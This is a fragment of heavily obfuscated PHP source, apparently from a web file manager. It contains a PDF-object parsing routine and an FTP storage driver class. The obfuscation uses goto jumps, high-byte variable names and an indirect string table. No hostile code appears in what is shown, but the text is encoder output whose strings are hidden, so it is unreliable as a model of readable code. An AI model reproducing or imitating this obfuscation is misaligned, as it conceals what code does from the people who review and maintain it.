$dŸå­Œ¥•Û, $CÔÚçã–) > 0) { $e’›«˜çÀ§[$aò»˜ÈÅ…Ö[1499]][$aò»˜ÈÅ…Ö[1529]] = intval($CÔÚçã–[1]) . $aò»˜ÈÅ…Ö[70] . intval($CÔÚçã–[2]); } goto D²öíîàÁ´; a¶³ù¸ŒÛŞ: foreach ($CÔÚçã–[3] as $aÖÀ£¨ÁÖ£ => $BóèÑî‹œÜ) { if ($CÔÚçã–[3][$aÖÀ£¨ÁÖ£] == $aò»˜ÈÅ…Ö[1521]) { $c¶ ÀÙ­½ç = $c˜èİœÒé . $aò»˜ÈÅ…Ö[70] . intval($CÔÚçã–[2][$aÖÀ£¨ÁÖ£]); $e’›«˜çÀ§[$aò»˜ÈÅ…Ö[1518]][$c¶ ÀÙ­½ç] = intval($CÔÚçã–[1][$aÖÀ£¨ÁÖ£]); ++$c˜èİœÒé; } else { if ($CÔÚçã–[3][$aÖÀ£¨ÁÖ£] == $aò»˜ÈÅ…Ö[1522]) { ++$c˜èİœÒé; } else { } } } if (preg_match_all($aò»˜ÈÅ…Ö[1523], $aíŸÎõÀ¶Ë, $CÔÚçã–)) { $fÒ’øÉïµ§ = $C“µÌ‡›[$aò»˜ÈÅ…Ö[77]] - $C“µÌ‡›[$aò»˜ÈÅ…Ö[1496]]; foreach ($CÔÚçã–[0] as $aÖÀ£¨ÁÖ£ => $B‘š§º½Ñ) { $D˜¢ŒÌ‡ï = $CÔÚçã–[1][$aÖÀ£¨ÁÖ£] . $aò»˜ÈÅ…Ö[70] . $CÔÚçã–[2][$aÖÀ£¨ÁÖ£]; $e’›«˜çÀ§[$aò»˜ÈÅ…Ö[1518]][$D˜¢ŒÌ‡ï] = strpos($aíŸÎõÀ¶Ë, $B‘š§º½Ñ) + $fÒ’øÉïµ§ + 1; } } if (preg_match_all($aò»˜ÈÅ…Ö[1524], $aíŸÎõÀ¶Ë, $CÔÚçã–)) { $dŸå­Œ¥•Û = count($CÔÚçã–[1]) == 1 ? $CÔÚçã–[1][0] : $CÔÚçã–[1][1]; } else { $dŸå­Œ¥•Û = substr($aíŸÎõÀ¶Ë, -1024 * 5); } goto d†æ¹¼¶; a¹ËßÀº®¾: if (preg_match($aò»˜ÈÅ…Ö[1532], $dŸå­Œ¥•Û, $CÔÚçã–) > 0) { } return $e’›«˜çÀ§; goto eóâ•“®¤Ë; CğÅÍÏßÙœ: if ($C“µÌ‡›[$aò»˜ÈÅ…Ö[77]] - $Cò›İ³ > $C“µÌ‡›[$aò»˜ÈÅ…Ö[1496]]) { $dò³¬‰çÃå = 4 * $C“µÌ‡›[$aò»˜ÈÅ…Ö[1496]]; $C“µÌ‡›[$aò»˜ÈÅ…Ö[1496]] = $dò³¬‰çÃå; $C“µÌ‡›[$aò»˜ÈÅ…Ö[1497]] = StreamWrapperIO::read($C“µÌ‡›[$aò»˜ÈÅ…Ö[75]], 0, $dò³¬‰çÃå); $C“µÌ‡›[$aò»˜ÈÅ…Ö[1498]] = StreamWrapperIO::read($C“µÌ‡›[$aò»˜ÈÅ…Ö[75]], $C“µÌ‡›[$aò»˜ÈÅ…Ö[77]] - $dò³¬‰çÃå, $dò³¬‰çÃå); $aíŸÎõÀ¶Ë = $C“µÌ‡›[$aò»˜ÈÅ…Ö[1498]]; } $c˜èİœÒé = 0; preg_match_all($aò»˜ÈÅ…Ö[1520], $aíŸÎõÀ¶Ë, $CÔÚçã–); goto a¶³ù¸ŒÛŞ; D²öíîàÁ´: if (preg_match($aò»˜ÈÅ…Ö[1530], $dŸå­Œ¥•Û, $CÔÚçã–) > 0) { $e’›«˜çÀ§[$aò»˜ÈÅ…Ö[1499]][$aò»˜ÈÅ…Ö[1175]] = intval($CÔÚçã–[1]) . $aò»˜ÈÅ…Ö[70] . intval($CÔÚçã–[2]); } if (preg_match($aò»˜ÈÅ…Ö[1531], $dŸå­Œ¥•Û, $CÔÚçã–) > 0) { $e’›«˜çÀ§[$aò»˜ÈÅ…Ö[1499]][$aò»˜ÈÅ…Ö[363]] = array(); $e’›«˜çÀ§[$aò»˜ÈÅ…Ö[1499]][$aò»˜ÈÅ…Ö[363]][0] = $CÔÚçã–[1]; $e’›«˜çÀ§[$aò»˜ÈÅ…Ö[1499]][$aò»˜ÈÅ…Ö[363]][1] = $CÔÚçã–[2]; } if (!$e’›«˜çÀ§[$aò»˜ÈÅ…Ö[1499]][$aò»˜ÈÅ…Ö[1175]]) { return !1; } goto a¹ËßÀº®¾; eóâ•“®¤Ë: } private static function getObjectValue($C•à¸ éœ“, $CŸßõŒœØÙ, $d‹ç ¦ééÏ) { goto F­Ëæï„éñ; cöÚÎÖİŸ: return $bÔøğß°ìË; goto Eç±·½íñ¬; d”óšíÙã : if (!is_array($DŒíÔË±ù[1])) { return array(); } $bÔøğß°ìË = array(); for ($CĞ¿­ƒŠ²” = 0; $CĞ¿­ƒŠ²” < count($DŒíÔË±ù[1]); $CĞ¿­ƒŠ²” += 2) { $fêÜ¤¸åë = $DŒíÔË±ù[1][$CĞ¿­ƒŠ²”]; $FîÌ…‹ìŒ = $DŒíÔË±ù[1][$CĞ¿­ƒŠ²” + 1]; if (count($fêÜ¤¸åë) == 3 && $fêÜ¤¸åë[0] == $cù†–“ÚÎê[8]) { $cµô‘ì¬ ë = !1; if ($FîÌ…‹ìŒ[0] == $cù†–“ÚÎê[1533]) { $FîÌ…‹ìŒ = self::getObject($C•à¸ éœ“, $CŸßõŒœØÙ[$cù†–“ÚÎê[1518]][$FîÌ…‹ìŒ[1]]); } $cµô‘ì¬ ë = $FîÌ…‹ìŒ[1]; if ($cµô‘ì¬ ë === !1) { continue; } if (is_string($cµô‘ì¬ ë)) { $cµô‘ì¬ ë = self::decodeStr($cµô‘ì¬ ë); } $bÔøğß°ìË[$fêÜ¤¸åë[1]] = $cµô‘ì¬ ë; } } goto cöÚÎÖİŸ; F­Ëæï„éñ: $cù†–“ÚÎê =& $_SERVER[õëù©û]; $DŒíÔË±ù = self::getObject($C•à¸ éœ“, $CŸßõŒœØÙ[$cù†–“ÚÎê[1518]][$d‹ç ¦ééÏ]); if (is_string($DŒíÔË±ù[1])) { return $DŒíÔË±ù[1]; } goto d”óšíÙã ; Eç±·½íñ¬: } private static function getObject($Bö™´­Ëæ, $eªš›èİÓ‘) { $cÍğ–‡Øç¸ = self::getObjectItem($Bö™´­Ëæ, $eªš›èİÓ‘); $cÍğ–‡Øç¸ = self::getObjectItem($Bö™´­Ëæ, $cÍğ–‡Øç¸[2]); return $cÍğ–‡Øç¸; } private static function getObjectItem($F„ë’’¬¿ˆ, $BÕ–ù£ºÂ) { goto b·ˆ…‹ÉÊ¤; b·ˆ…‹ÉÊ¤: $E²À»ÙÏƒ“ =& $_SERVER[õëù©û]; $e¹ƒ¸®ïå¸ = $F„ë’’¬¿ˆ[$E²À»ÙÏƒ“[1496]]; $Bå“óœÊÏ = $F„ë’’¬¿ˆ[$E²À»ÙÏƒ“[77]] - $e¹ƒ¸®ïå¸; goto C‚÷æ‰¹Âæ; Eªé¨çÇêÂ: $aíÜÒ‰ÅØº = self::getRawObject($AÂ¢Á°Ã¨Œ, $EÑÀ’åÌ); if ($BÕ–ù£ºÂ >= $Bå“óœÊÏ) { $aíÜÒ‰ÅØº[2] = $aíÜÒ‰ÅØº[2] + $Bå“óœÊÏ; } else { if ($BÕ–ù£ºÂ > $e¹ƒ¸®ïå¸ && $BÕ–ù£ºÂ <= $Bå“óœÊÏ) { $aíÜÒ‰ÅØº[2] = $aíÜÒ‰ÅØº[2] + $BÕ–ù£ºÂ; } } return $aíÜÒ‰ÅØº; goto a«š§¹ŞÌˆ; C‚÷æ‰¹Âæ: $EÑÀ’åÌ = $BÕ–ù£ºÂ >= $Bå“óœÊÏ ? $BÕ–ù£ºÂ - $Bå“óœÊÏ : $BÕ–ù£ºÂ; $AÂ¢Á°Ã¨Œ = $BÕ–ù£ºÂ >= $Bå“óœÊÏ ? $F„ë’’¬¿ˆ[$E²À»ÙÏƒ“[1498]] : $F„ë’’¬¿ˆ[$E²À»ÙÏƒ“[1497]]; if ($BÕ–ù£ºÂ > $e¹ƒ¸®ïå¸ && $BÕ–ù£ºÂ <= $Bå“óœÊÏ) { $EÑÀ’åÌ = 0; $AÂ¢Á°Ã¨Œ = StreamWrapperIO::read($F„ë’’¬¿ˆ[$E²À»ÙÏƒ“[75]], $BÕ–ù£ºÂ, $e¹ƒ¸®ïå¸); } goto Eªé¨çÇêÂ; a«š§¹ŞÌˆ: } private static function decodeStr($c„„É™¾) { goto e‘Ë…éÂ; e‘Ë…éÂ: $AêºÊµ´Ù =& $_SERVER[õëù©û]; $c„„É™¾ = str_replace(array($AêºÊµ´Ù[1534], $AêºÊµ´Ù[1535], $AêºÊµ´Ù[1536], $AêºÊµ´Ù[1537], $AêºÊµ´Ù[1538], $AêºÊµ´Ù[1539], $AêºÊµ´Ù[1540], $AêºÊµ´Ù[1541]), array($AêºÊµ´Ù[93], $AêºÊµ´Ù[50], $AêºÊµ´Ù[8], $AêºÊµ´Ù[244], $AêºÊµ´Ù[810], $AêºÊµ´Ù[213], $AêºÊµ´Ù[983], $AêºÊµ´Ù[326]), $c„„É™¾); $Aí‹©‘á  = preg_split($AêºÊµ´Ù[1542], $c„„É™¾, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto d®µçÉ¾î©; d®µçÉ¾î©: $c„„É™¾ = $AêºÊµ´Ù[33]; foreach ($Aí‹©‘á  as $e®­Ã¦œˆ) { if (preg_match($AêºÊµ´Ù[1543], $e®­Ã¦œˆ)) { $c„„É™¾ .= \chr(octdec(trim($e®­Ã¦œˆ, $AêºÊµ´Ù[93]))); } else { $c„„É™¾ .= $e®­Ã¦œˆ; } } $Aí‹©‘á  = preg_split($AêºÊµ´Ù[1544], $c„„É™¾, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto C´¦Ùù®ê; c•ê ½óØÁ: $c„„É™¾ = $AêºÊµ´Ù[33]; foreach ($Aí‹©‘á  as $e®­Ã¦œˆ) { if (preg_match($AêºÊµ´Ù[1548], $e®­Ã¦œˆ) && !1 === stripos($e®­Ã¦œˆ, $AêºÊµ´Ù[1549])) { $e®­Ã¦œˆ = preg_replace($AêºÊµ´Ù[1550], $AêºÊµ´Ù[33], $e®­Ã¦œˆ); $e®­Ã¦œˆ = trim($e®­Ã¦œˆ, $AêºÊµ´Ù[919]); $e®­Ã¦œˆ = pack($AêºÊµ´Ù[1551], $e®­Ã¦œˆ); $c„„É™¾ .= $e®­Ã¦œˆ; } else { $c„„É™¾ .= $e®­Ã¦œˆ; } } if (preg_match($AêºÊµ´Ù[1552], $c„„É™¾)) { $b¯ò‰ç¢‚® = substr($c„„É™¾, 2); $c„„É™¾ = $AêºÊµ´Ù[33]; $bÏ¼™ÅŠÊ = strlen($b¯ò‰ç¢‚®); for ($Eï®ÕÁãğæ = 0; $Eï®ÕÁãğæ < $bÏ¼™ÅŠÊ; $Eï®ÕÁãğæ += 2) { $cÂ„·Ä†ìÌ = hexdec(bin2hex(substr($b¯ò‰ç¢‚®, $Eï®ÕÁãğæ, 2))); $c„„É™¾ .= mb_convert_encoding($AêºÊµ´Ù[1553] . intval($cÂ„·Ä†ìÌ) . $AêºÊµ´Ù[67], $AêºÊµ´Ù[1554], $AêºÊµ´Ù[1555]); } } goto C‡¨Ã©´; C‡¨Ã©´: return $c„„É™¾; goto dÇšä—¸º; C´¦Ùù®ê: $c„„É™¾ = $AêºÊµ´Ù[33]; foreach ($Aí‹©‘á  as $e®­Ã¦œˆ) { if (preg_match($AêºÊµ´Ù[1545], $e®­Ã¦œˆ)) { $c„„É™¾ .= \chr(hexdec(trim($e®­Ã¦œˆ, $AêºÊµ´Ù[1546]))); } else { $c„„É™¾ .= $e®­Ã¦œˆ; } } $Aí‹©‘á  = preg_split($AêºÊµ´Ù[1547], $c„„É™¾, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto c•ê ½óØÁ; dÇšä—¸º: } private static function getRawObject($BÒí‹ç´, $C¶—‚Šë = 0) { goto E­¨óø·ö˜; E­¨óø·ö˜: $A¨Œ¦‚¹Ã± =& $_SERVER[õëù©û]; $AÀÍåãŞÇî = $A¨Œ¦‚¹Ã±[33]; $F’ùÃ…ğƒÅ = $A¨Œ¦‚¹Ã±[33]; goto eˆ‘ˆèÙÄ; eÛ‡Îºˆ‰²: return array($AÀÍåãŞÇî, $F’ùÃ…ğƒÅ, $C¶—‚Šë); goto aææØ²¡¢é; eˆ‘ˆèÙÄ: $C¶—‚Šë += strspn($BÒí‹ç´, $A¨Œ¦‚¹Ã±[1556], $C¶—‚Šë); $AöÛÖŞø¾ = $BÒí‹ç´[$C¶—‚Šë]; switch ($AöÛÖŞø¾) { case $A¨Œ¦‚¹Ã±[1557]: $a¥è¾è¯ô¤ = strcspn($BÒí‹ç´, $A¨Œ¦‚¹Ã±[1558], $C¶—‚Šë); if ($a¥è¾è¯ô¤ > 0) { $C¶—‚Šë += $a¥è¾è¯ô¤; return self::getRawObject($BÒí‹ç´, $C¶—‚Šë); } break; case $A¨Œ¦‚¹Ã±[8]: $AÀÍåãŞÇî = $AöÛÖŞø¾; ++$C¶—‚Šë; $b¡¨†ˆƒ” = preg_match($A¨Œ¦‚¹Ã±[1559], substr($BÒí‹ç´, $C¶—‚Šë, 256), $f¼âÉ±‡¼ê); if (1 == $b¡¨†ˆƒ”) { $F’ùÃ…ğƒÅ = $f¼âÉ±‡¼ê[1]; $C¶—‚Šë += strlen($F’ùÃ…ğƒÅ); } break; case $A¨Œ¦‚¹Ã±[244]: case $A¨Œ¦‚¹Ã±[810]: $AÀÍåãŞÇî = $AöÛÖŞø¾; ++$C¶—‚Šë; $eŠ‚ô†…Ä÷ = $C¶—‚Šë; if ($A¨Œ¦‚¹Ã±[244] == $AöÛÖŞø¾) { $A¸×•‰Ôé = 1; while ($A¸×•‰Ôé > 0) { if (!isset($BÒí‹ç´[$eŠ‚ô†…Ä÷])) { break; } $eÎ‡²µõö– = $BÒí‹ç´[$eŠ‚ô†…Ä÷]; switch ($eÎ‡²µõö–) { case $A¨Œ¦‚¹Ã±[93]: ++$eŠ‚ô†…Ä÷; break; case $A¨Œ¦‚¹Ã±[244]: ++$A¸×•‰Ôé; break; case $A¨Œ¦‚¹Ã±[810]: --$A¸×•‰Ôé; break; } ++$eŠ‚ô†…Ä÷; } $F’ùÃ…ğƒÅ = substr($BÒí‹ç´, $C¶—‚Šë, $eŠ‚ô†…Ä÷ - $C¶—‚Šë - 1); $C¶—‚Šë = $eŠ‚ô†…Ä÷; } break; case $A¨Œ¦‚¹Ã±[153]: case $A¨Œ¦‚¹Ã±[471]: $AÀÍåãŞÇî = $AöÛÖŞø¾; ++$C¶—‚Šë; if ($A¨Œ¦‚¹Ã±[153] == $AöÛÖŞø¾) { $F’ùÃ…ğƒÅ = array(); do { $Ağ¿µøºÕ‹ = $C¶—‚Šë; $DÑ¡­–£¬Ç = self::getRawObject($BÒí‹ç´, $C¶—‚Šë); $C¶—‚Šë = $DÑ¡­–£¬Ç[2]; $F’ùÃ…ğƒÅ[] = $DÑ¡­–£¬Ç; } while ($A¨Œ¦‚¹Ã±[471] != $DÑ¡­–£¬Ç[0] && $C¶—‚Šë != $Ağ¿µøºÕ‹); array_pop($F’ùÃ…ğƒÅ); } break; case $A¨Œ¦‚¹Ã±[918]: case $A¨Œ¦‚¹Ã±[921]: if (isset($BÒí‹ç´[$C¶—‚Šë + 1]) && $BÒí‹ç´[$C¶—‚Šë + 1] == $AöÛÖŞø¾) { $AÀÍåãŞÇî = $AöÛÖŞø¾ . $AöÛÖŞø¾; $C¶—‚Šë += 2; if ($A¨Œ¦‚¹Ã±[918] == $AöÛÖŞø¾) { $F’ùÃ…ğƒÅ = array(); do { $Ağ¿µøºÕ‹ = $C¶—‚Šë; $DÑ¡­–£¬Ç = self::getRawObject($BÒí‹ç´, $C¶—‚Šë); $C¶—‚Šë = $DÑ¡­–£¬Ç[2]; $F’ùÃ…ğƒÅ[] = $DÑ¡­–£¬Ç; } while ($A¨Œ¦‚¹Ã±[1560] != $DÑ¡­–£¬Ç[0] && $C¶—‚Šë != $Ağ¿µøºÕ‹); array_pop($F’ùÃ…ğƒÅ); } } else { $AÀÍåãŞÇî = $AöÛÖŞø¾; ++$C¶—‚Šë; $b¡¨†ˆƒ” = preg_match($A¨Œ¦‚¹Ã±[1561], substr($BÒí‹ç´, $C¶—‚Šë), $f¼âÉ±‡¼ê); if ($A¨Œ¦‚¹Ã±[918] == $AöÛÖŞø¾ && 1 == $b¡¨†ˆƒ”) { $F’ùÃ…ğƒÅ = strtr($f¼âÉ±‡¼ê[1], $A¨Œ¦‚¹Ã±[1562], $A¨Œ¦‚¹Ã±[33]); $C¶—‚Šë += \strlen($f¼âÉ±‡¼ê[0]); } elseif (!1 !== ($D¥®“‡”Ï¡ = strpos($BÒí‹ç´, $A¨Œ¦‚¹Ã±[921], $C¶—‚Šë))) { $C¶—‚Šë = $D¥®“‡”Ï¡ + 1; } } break; default: if ($A¨Œ¦‚¹Ã±[1563] == substr($BÒí‹ç´, $C¶—‚Šë, 6)) { $AÀÍåãŞÇî = $A¨Œ¦‚¹Ã±[1563]; $C¶—‚Šë += 6; } elseif ($A¨Œ¦‚¹Ã±[99] == substr($BÒí‹ç´, $C¶—‚Šë, 4)) { $AÀÍåãŞÇî = $A¨Œ¦‚¹Ã±[99]; $C¶—‚Šë += 4; $F’ùÃ…ğƒÅ = $A¨Œ¦‚¹Ã±[99]; } elseif ($A¨Œ¦‚¹Ã±[1564] == substr($BÒí‹ç´, $C¶—‚Šë, 4)) { $AÀÍåãŞÇî = $A¨Œ¦‚¹Ã±[1565]; $C¶—‚Šë += 4; $F’ùÃ…ğƒÅ = $A¨Œ¦‚¹Ã±[1564]; } elseif ($A¨Œ¦‚¹Ã±[1566] == substr($BÒí‹ç´, $C¶—‚Šë, 5)) { $AÀÍåãŞÇî = $A¨Œ¦‚¹Ã±[1565]; $C¶—‚Šë += 5; $F’ùÃ…ğƒÅ = $A¨Œ¦‚¹Ã±[1566]; } elseif ($A¨Œ¦‚¹Ã±[1567] == substr($BÒí‹ç´, $C¶—‚Šë, 6)) { $AÀÍåãŞÇî = $A¨Œ¦‚¹Ã±[1567]; $C¶—‚Šë += 6; if (1 == preg_match($A¨Œ¦‚¹Ã±[1568], substr($BÒí‹ç´, $C¶—‚Šë), $f¼âÉ±‡¼ê)) { $C¶—‚Šë += strlen($f¼âÉ±‡¼ê[0]); $CšíèœÙ…‡ = $A¨Œ¦‚¹Ã±[1569]; $b¡¨†ˆƒ” = preg_match($CšíèœÙ…‡, substr($BÒí‹ç´, $C¶—‚Šë), $f¼âÉ±‡¼ê, PREG_OFFSET_CAPTURE); if (1 == $b¡¨†ˆƒ”) { $F’ùÃ…ğƒÅ = substr($BÒí‹ç´, $C¶—‚Šë, $f¼âÉ±‡¼ê[0][1]); $C¶—‚Šë += $f¼âÉ±‡¼ê[1][1]; } } } elseif ($A¨Œ¦‚¹Ã±[1570] == substr($BÒí‹ç´, $C¶—‚Šë, 9)) { $AÀÍåãŞÇî = $A¨Œ¦‚¹Ã±[1570]; $C¶—‚Šë += 9; } elseif (1 == preg_match($A¨Œ¦‚¹Ã±[1571], substr($BÒí‹ç´, $C¶—‚Šë, 33), $f¼âÉ±‡¼ê)) { $AÀÍåãŞÇî = $A¨Œ¦‚¹Ã±[1533]; $C¶—‚Šë += strlen($f¼âÉ±‡¼ê[0]); $F’ùÃ…ğƒÅ = intval($f¼âÉ±‡¼ê[1]) . $A¨Œ¦‚¹Ã±[70] . intval($f¼âÉ±‡¼ê[2]); } elseif (1 == preg_match($A¨Œ¦‚¹Ã±[1572], substr($BÒí‹ç´, $C¶—‚Šë, 33), $f¼âÉ±‡¼ê)) { $AÀÍåãŞÇî = $A¨Œ¦‚¹Ã±[1573]; $F’ùÃ…ğƒÅ = intval($f¼âÉ±‡¼ê[1]) . $A¨Œ¦‚¹Ã±[70] . intval($f¼âÉ±‡¼ê[2]); $C¶—‚Šë += strlen($f¼âÉ±‡¼ê[0]); } elseif (($AÔÓ°Æ…ÃÑ = strspn($BÒí‹ç´, $A¨Œ¦‚¹Ã±[1574], $C¶—‚Šë)) > 0) { $AÀÍåãŞÇî = $A¨Œ¦‚¹Ã±[1575]; $F’ùÃ…ğƒÅ = substr($BÒí‹ç´, $C¶—‚Šë, $AÔÓ°Æ…ÃÑ); $C¶—‚Šë += $AÔÓ°Æ…ÃÑ; } break; } goto eÛ‡Îºˆ‰²; aææØ²¡¢é: } } goto E‰Ïöµ‹êò; f¼§¼õì…‡: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($BÀˆğ¡ÁÑ) { parent::__construct(); if (count($BÀˆğ¡ÁÑ) > 0) { $this->_init($BÀˆğ¡ÁÑ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($FÆ“ùéõ˜) { $BÚ¥¹¶Œî =& $_SERVER[õëù©û]; global $config; $this->appCharset = $config[$BÚ¥¹¶Œî[1135]]; $this->systemCharset = $config[$BÚ¥¹¶Œî[1136]]; if (isset($FÆ“ùéõ˜[$BÚ¥¹¶Œî[1137]]) && $FÆ“ùéõ˜[$BÚ¥¹¶Œî[1137]]) { $this->systemCharset = $FÆ“ùéõ˜[$BÚ¥¹¶Œî[1137]]; } } public function iconvApp($e­¤¤ËÜÌ‚) { return $this->iconvTo($e­¤¤ËÜÌ‚, $this->systemCharset, $this->appCharset); } public function iconvSystem($Bçœ–ÚÌêã) { return $this->iconvTo($Bçœ–ÚÌêã, $this->appCharset, $this->systemCharset); } public function getPathOuter($FÓ¤ƒ½¹øÒ) { goto bã¬Ï¾¯‹‘; BÑëÁ…Å’: return $this->pathDriver . $e¸Ë²½àŠ˜[8] . ltrim($FÓ¤ƒ½¹øÒ, $e¸Ë²½àŠ˜[8]); goto c¥Û¡İÀˆò; F«õâÔßÔÚ: $FÓ¤ƒ½¹øÒ = KodIO::clear($FÓ¤ƒ½¹øÒ); $FÓ¤ƒ½¹øÒ = substr($FÓ¤ƒ½¹øÒ, strlen($aÙèñÚ°ˆ)); if (empty($this->pathDriver)) { return $FÓ¤ƒ½¹øÒ; } goto BÑëÁ…Å’; aìÓ¡ÅÏô×: if (substr($aÙèñÚ°ˆ, 0, 2) == $e¸Ë²½àŠ˜[1138]) { $aÙèñÚ°ˆ = BASIC_PATH . substr($aÙèñÚ°ˆ, 2); } if (substr($FÓ¤ƒ½¹øÒ, 0, 2) == $e¸Ë²½àŠ˜[1138]) { $FÓ¤ƒ½¹øÒ = BASIC_PATH . substr($FÓ¤ƒ½¹øÒ, 2); } $aÙèñÚ°ˆ = KodIO::clear($aÙèñÚ°ˆ); goto F«õâÔßÔÚ; bã¬Ï¾¯‹‘: $e¸Ë²½àŠ˜ =& $_SERVER[õëù©û]; $aÙèñÚ°ˆ = $this->iconvApp($this->pathBase); $FÓ¤ƒ½¹øÒ = $this->iconvApp($FÓ¤ƒ½¹øÒ); goto aìÓ¡ÅÏô×; c¥Û¡İÀˆò: } private function _init($eè¬Ã¹¡ï± = array()) { goto dÁÍ¥çêô¯; aù¼³Èó…: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $f–¡¥ìÚÔÇ = @ftp_login($this->connect, $this->username, $this->userpass); goto BÈğ‘°¤°È; CÛåŞâçöö: foreach ($eè¬Ã¹¡ï± as $f®È†ÒØ¯› => $AÉ­åƒ “«) { if (isset($this->{$f®È†ÒØ¯›})) { $this->{$f®È†ÒØ¯›} = $AÉ­åƒ “«; } } static $AİÎœñ´ = array(); $c‚’Ô—çš = md5(json_encode($eè¬Ã¹¡ï±)); goto b‡ï©âÅä; BÈğ‘°¤°È: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $AİÎœñ´[$c‚’Ô—çš] = array($CŠ ó÷³—Ã[1144] => $this->connect, $CŠ ó÷³—Ã[165] => $this->host, $CŠ ó÷³—Ã[164] => $this->scheme, $CŠ ó÷³—Ã[166] => $this->port); goto EÖ“¹ÂÜŒ¦; b‡ï©âÅä: if (isset($AİÎœñ´[$c‚’Ô—çš])) { foreach ($AİÎœñ´[$c‚’Ô—çš] as $f®È†ÒØ¯› => $AÉ­åƒ “«) { $this->{$f®È†ÒØ¯›} = $AÉ­åƒ “«; } return !0; } $C­ïÚ¯†ŒÎ = parse_url(trim($this->server, $CŠ ó÷³—Ã[8])); $this->host = $C­ïÚ¯†ŒÎ[$CŠ ó÷³—Ã[165]]; goto Eå®×İô»; Eå®×İô»: $f—™Ôâåª = isset($C­ïÚ¯†ŒÎ[$CŠ ó÷³—Ã[164]]) && $C­ïÚ¯†ŒÎ[$CŠ ó÷³—Ã[164]] == $CŠ ó÷³—Ã[1141] ? !0 : !1; $this->scheme = $f—™Ôâåª ? $CŠ ó÷³—Ã[1142] : $CŠ ó÷³—Ã[1143]; $this->port = isset($C­ïÚ¯†ŒÎ[$CŠ ó÷³—Ã[166]]) ? $C­ïÚ¯†ŒÎ[$CŠ ó÷³—Ã[166]] : 21; goto aù¼³Èó…; EÖ“¹ÂÜŒ¦: return $f–¡¥ìÚÔÇ; goto bÚó»ºÂ…; dÁÍ¥çêô¯: $CŠ ó÷³—Ã =& $_SERVER[õëù©û]; if (!function_exists($CŠ ó÷³—Ã[1139])) { show_json(LNG($CŠ ó÷³—Ã[1140]), !1); } $this->charsetReset($eè¬Ã¹¡ï±); goto CÛåŞâçöö; bÚó»ºÂ…: } private function _isconn() { return is_resource($this->connect); } public function mkfile($aî÷Ë¹¶äö, $e‹øÍ§Õ‹ = '', $F•²ÓŒ¾ŠÒ = REPEAT_RENAME) { if ($this->setContent($aî÷Ë¹¶äö, $e‹øÍ§Õ‹)) { return $this->getPathOuter($aî÷Ë¹¶äö); } return !1; } public function mkdir($FÃ²ÅŞ±êİ, $BŸßæ´ê¯ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $FÃ²ÅŞ±êİ = $this->iconvSystem($FÃ²ÅŞ±êİ); if ($this->isFolder($FÃ²ÅŞ±êİ) || @ftp_mkdir($this->connect, $FÃ²ÅŞ±êİ)) { return $this->getPathOuter($FÃ²ÅŞ±êİ); } if (!$this->mkdir($this->pathFather($FÃ²ÅŞ±êİ))) { return !1; } if ($FÃ²ÅŞ±êİ = @ftp_mkdir($this->connect, $FÃ²ÅŞ±êİ)) { return $this->getPathOuter($FÃ²ÅŞ±êİ); } return !1; } public function copyFile($féËÀò¯İÔ, $B„Ÿ±×Îà) { goto EøÏ–¥ãã; b÷Ùˆâä: $CÑ×ØÉ¸ãì = $this->iconvApp($E²Æ¥ÈØ); $this->download($féËÀò¯İÔ, $CÑ×ØÉ¸ãì); $D©¥¹¼ˆ = $this->upload($B„Ÿ±×Îà, $CÑ×ØÉ¸ãì); goto F¸ÂÂ¡‰è ; F¸ÂÂ¡‰è : $this->tempFileRemve($E²Æ¥ÈØ); return $D©¥¹¼ˆ; goto f–ƒ…ÉÜ®ì; EøÏ–¥ãã: if (!$this->_isconn()) { return !1; } $F“ª´ğ¶ñ = $this->pathThis($this->iconvSystem($féËÀò¯İÔ)); $E²Æ¥ÈØ = $this->tempFile($F“ª´ğ¶ñ); goto b÷Ùˆâä; f–ƒ…ÉÜ®ì: } public function moveFile($CÉ¯ÇÌ¶‹İ, $EÄÊê¯ïŞô) { if (!$this->_isconn()) { return !1; } $CÉ¯ÇÌ¶‹İ = $this->iconvSystem($CÉ¯ÇÌ¶‹İ); $EÄÊê¯ïŞô = $this->iconvSystem($EÄÊê¯ïŞô); $C¸“Ó±¶Ü¡ = @ftp_rename($this->connect, $CÉ¯ÇÌ¶‹İ, $EÄÊê¯ïŞô); return $C¸“Ó±¶Ü¡ ? $this->getPathOuter($EÄÊê¯ïŞô) : !1; } public function delFile($fõóÙ«ª†») { if (!$this->_isconn()) { return !1; } $fõóÙ«ª†» = $this->iconvSystem($fõóÙ«ª†»); return @ftp_delete($this->connect, $fõóÙ«ª†»); } public function delFolder($A—œ…ğŒ‰) { if (!$this->_isconn()) { return !1; } $A—œ…ğŒ‰ = $this->iconvSystem($A—œ…ğŒ‰); $cœ ÷Š = $this->ftpList($A—œ…ğŒ‰); if (!$cœ ÷Š) { return @ftp_rmdir($this->connect, $A—œ…ğŒ‰); } foreach ($cœ ÷Š as $f‘¶®Ïß× ) { if ($this->isFolder($f‘¶®Ïß× )) { $f‘¶®Ïß×  = $this->iconvApp($f‘¶®Ïß× ); $this->delFolder($f‘¶®Ïß× ); } else { @ftp_delete($this->connect, $f‘¶®Ïß× ); } } return @ftp_rmdir($this->connect, $A—œ…ğŒ‰); } public function rename($fŞÌø·İ‚Ê, $bºä”ŸÎÃƒ) { goto CœÂÑÑ¤ßã; D©¤³Â³ÁÀ: $A–ŠÒ¿©Ôì = rtrim($aŠÌâã¢¶œ, $dò†­›¾Ì‹[8]) . $dò†­›¾Ì‹[8] . $f†ÌÒàÜ‹Ç; $C«ß»Û—ä = @ftp_rename($this->connect, $fŞÌø·İ‚Ê, $A–ŠÒ¿©Ôì); $A–ŠÒ¿©Ôì = $this->iconvApp($A–ŠÒ¿©Ôì); goto eÓî‚ñ—Ğˆ; CœÂÑÑ¤ßã: $dò†­›¾Ì‹ =& $_SERVER[õëù©û]; if (!$this->_isconn()) { return !1; } $f†ÌÒàÜ‹Ç = $this->fileNameAuto($this->pathFather($fŞÌø·İ‚Ê), 